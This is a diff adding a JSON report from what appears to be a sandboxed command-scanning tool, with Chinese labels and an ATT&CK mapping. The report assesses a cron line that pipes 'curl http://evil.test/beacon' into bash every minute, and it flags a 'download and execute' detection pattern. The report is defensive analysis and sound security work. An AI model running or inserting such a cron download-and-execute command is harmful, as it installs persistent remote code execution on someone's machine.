@@ -1,0 +1,238 @@
+{
+  "version": "4.1",
+  "command": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -",
+  "timestamp": "2026-03-20T03:02:18.901502+00:00",
+  "verdict": "SUSPICIOUS",
+  "risk_score": 25,
+  "confidence": "LOW",
+  "recommendations": [
+    "REVIEW: 建议人工审核此命令后再决定是否放行",
+    "置信度较低, 可能为误报, 请结合上下文判断"
+  ],
+  "is_legitimate_pattern": false,
+  "findings_summary": {
+    "total": 1,
+    "critical": 0,
+    "warn": 1,
+    "info": 0,
+    "dimensions_hit": 1
+  },
+  "findings": [
+    {
+      "severity": "WARN",
+      "dimension": "静态分析",
+      "description": "命令匹配恶意模式: download and execute (curl|sh)",
+      "risk_score": 25,
+      "mitre_attack": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "evidence": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -"
+    }
+  ],
+  "evidence": {
+    "command_chain": {
+      "stages": 2,
+      "connectors": [
+        "|",
+        "END"
+      ],
+      "safe_then_evil": false
+    },
+    "stdout_lines": 0,
+    "stderr_lines": 1,
+    "exec_duration_sec": 1.0,
+    "external_connections": [],
+    "c2_port_hits": [],
+    "files_added": 0,
+    "files_deleted": 0,
+    "inotify_sys_events": 0,
+    "inotify_tmp_events": 6009,
+    "exit_code": 127,
+    "critical_bins_changed": false,
+    "new_symlinks": 0,
+    "new_file_caps": 0,
+    "permission_issues": [],
+    "mitre_techniques": [
+      "T1105"
+    ]
+  },
+  "dimensions": {
+    "files_added": [],
+    "files_deleted": [],
+    "inotify_sys_events": [],
+    "inotify_tmp_events": [
+      "2026-03-20T03:01:41 CREATE /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J",
+      "2026-03-20T03:01:41 MODIFY /tmp/sort0xX55J"
+    ],
+    "external_connections": [],
+    "suid_new": [],
+    "suid_removed": [],
+    "new_symlinks": [],
+    "new_file_caps": [],
+    "critical_bins_tampered": false,
+    "high_entropy_files": [],
+    "exit_code": 127,
+    "attack_chains": []
+  },
+  "mitre_attack": {
+    "T1105": {
+      "name": "Ingress Tool Transfer",
+      "findings": [
+        "命令匹配恶意模式: download and execute (curl|sh)"
+      ]
+    }
+  },
+  "mitre_tactics": {
+    "Command and Control": [
+      "T1105"
+    ]
+  },
+  "deobfuscation": {
+    "original": "echo '* * * * * curl http://evil.test/beacon | bash' | crontab -",
+    "deobfuscated": null,
+    "layers": []
+  },
+  "timeline": [
+    {
+      "phase": "baseline",
+      "time": "1773975672",
+      "desc": "基线采集完成"
+    },
+    {
+      "phase": "probes_start",
+      "time": "1773975694",
+      "desc": "探针启动 + 命令执行开始"
+    },
+    {
+      "phase": "exec_end",
+      "time": "1773975695",
+      "desc": "命令执行结束 (耗时 1.0s, 退出码 127)"
+    },
+    {
+      "phase": "post_snapshot",
+      "time": "1773975739",
+      "desc": "后置快照 + 分析完成"
+    }
+  ],
+  "stdout": [],
+  "stderr": [
+    "bash: line 1: crontab: command not found"
+  ],
+  "text_summary": "⚠️ 判定: SUSPICIOUS (风险分: 25/100, 置信度: LOW)\n命令: echo '* * * * * curl http://evil.test/beacon | bash' | crontab -\n\n发现 1 个问题 (0 严重, 1 警告):\n  [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]\n\n涉及 ATT&CK 战术: Command and Control\n\n建议:\n  • REVIEW: 建议人工审核此命令后再决定是否放行\n  • 置信度较低, 可能为误报, 请结合上下文判断",
+  "fast_triage": {
+    "level": "BLOCK",
+    "static_score": 25,
+    "is_legitimate": false,
+    "blacklisted": true,
+    "patterns_matched": 1,
+    "matches": [
+      {
+        "pattern": "download and execute (curl|sh)",
+        "mitre": "T1105",
+        "score": 25
+      }
+    ],
+    "deobfuscation_layers": 0
+  }
+}
